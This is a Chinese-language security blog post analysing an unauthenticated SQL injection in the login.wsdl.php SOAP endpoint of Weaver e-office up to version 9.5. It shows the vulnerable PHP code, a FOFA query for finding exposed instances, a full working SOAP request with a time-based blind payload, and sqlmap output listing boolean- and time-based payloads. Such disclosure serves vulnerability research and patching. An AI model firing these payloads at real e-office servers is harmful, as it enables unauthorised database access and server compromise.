---
title: "泛微e-office login.wsdl.php sql注入漏洞"
source: https://mrxn.net/jswz/eoffice-webservice-json-login-wsdl-sqli.html
asset_dir: assets/泛微e-office-login.wsdl.php-sql注入漏洞
---

# 泛微e-office login.wsdl.php sql注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/3/21 08:29
- 884浏览
- [0评论](#comment)
- 39分钟阅读

深入探索

数据库

Office

身份验证

---

# 漏洞简介

[泛微](https://mrxn.net/tag/%E6%B3%9B%E5%BE%AE)E-Office是一款标准化的协同 OA 办公[软件](#)，泛微协同办公产品系列成员之一,实行通用化产品设计，充分贴合企业管理需求，本着简洁易用、高效智能的原则，为企业快速打造移动化、无纸化、数字化的办公平台。泛微e-office login.wsdl.php 接口处存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，未经身份验证的恶意攻击者利用 SQL 注入漏洞获取数据库中的信息（例如管理员后台密码、站点用户个人信息）之外，攻击者甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。

商务软件和生产力软件

# 影响版本

e-office <=9.5

# fofa语句

> `app="泛微-EOffice"`

# 漏洞分析

同样通过解析 wsdl 后有很多功能

深入探索

漏洞扫描器

漏洞修复方案

文本剥离工具

[![泛微e-office login.wsdl.php sql注入漏洞](images/img-001-77d89be558ce.webp)](https://image.mrxn.net/089f781d1d3b462f8092c26bda4b5f71.webp)

[webservice](#)-json/login/login.wsdl.php 的 `UserLogin` 业务逻辑如下

编程

```
function UserLogin( $UserName, $Password )
{
    $loginStatus = array( );
    if ( trim( $UserName ) == "" )
    {
        $loginStatus['status'] = "false";
        $loginStatus['infor'] = "用户名为空";
        return $loginStatus;
    }
    $user = new user( );
    if ( $user->CheckUserAccount( $UserName ) == false )
    {
        $loginStatus['status'] = "false";
        $loginStatus['infor'] = "用户名不存在";
        return $loginStatus;
    }
    $userID = $user->getUserIDByUserAccount( $UserName );
```

深入探索

编码转换工具

网络安全培训

VPN服务

`$UserName` 首先带入 `CheckUserAccount` 函数

```
public function CheckUserAccount( $userAccount )
{
  global $connection;
  if ( trim( $userAccount ) == "" )
  {
    return false;
  }
  $sql = "SELECT COUNT(*) AS cnt FROM user WHERE USER_ACCOUNTS='".$userAccount."'";
  $rs = exequery( $connection, $sql );
  $row = mysql_fetch_array( $rs );
```

`$userAccount` 被直接拼接进SQL语句后执行，无任何过滤校验，造成[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。

# 漏洞复现

```
POST /webservice-json/login/login.wsdl.php HTTP/1.1
User-Agent: Apache-HttpClient/4.5.5 (Java/17.0.12)
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
SOAPAction: urn:LoginServicewsdl#UserLogin
Content-Type: text/xml;charset=UTF-8
Host: eoffice.mrxn.net:8082

<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:LoginServicewsdl">
   <soapenv:Header/>
   <soapenv:Body>
      <urn:UserLogin soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
         <UserName xsi:type="xsd:string">gero' AND 8955=BENCHMARK(5000000,MD5(0x78514279))-- rPQC</UserName>
         <Password xsi:type="xsd:string">sonoras imperio</Password>
      </urn:UserLogin>
   </soapenv:Body>
</soapenv:Envelope>
```

[![泛微e-office login.wsdl.php sql注入漏洞](images/img-002-f5b86ee4db41.webp)](https://image.mrxn.net/ef65f87832c94e2e9ec941c801e77e12.webp)

成功在延时 5 秒

代码安全审计

[sqlmap](https://mrxn.net/tag/sqlmap) 结果如下

```
sqlmap identified the following injection point(s) with a total of 418 HTTP(s) requests:
---
Parameter: SOAP #1* ((custom) POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:LoginServicewsdl">
   <soapenv:Header/>
   <soapenv:Body>
      <urn:UserLogin soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
         <UserName xsi:type="xsd:string">gero' RLIKE (SELECT (CASE WHEN (5168=5168) THEN 0x6765726f ELSE 0x28 END))-- JQeZ</UserName>
         <Password xsi:type="xsd:string">sonoras imperio</Password>
      </urn:UserLogin>
   </soapenv:Body>
</soapenv:Envelope>

    Type: time-based blind
    Title: MySQL < 5.0.12 AND time-based blind (BENCHMARK)
    Payload: <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:LoginServicewsdl">
   <soapenv:Header/>
   <soapenv:Body>
      <urn:UserLogin soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
         <UserName xsi:type="xsd:string">gero' AND 8955=BENCHMARK(5000000,MD5(0x78514279))-- rPQC</UserName>
         <Password xsi:type="xsd:string">sonoras imperio</Password>
      </urn:UserLogin>
   </soapenv:Body>
</soapenv:Envelope>
---
```

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#泛微](https://mrxn.net/tag/%E6%B3%9B%E5%BE%AE)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语句](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
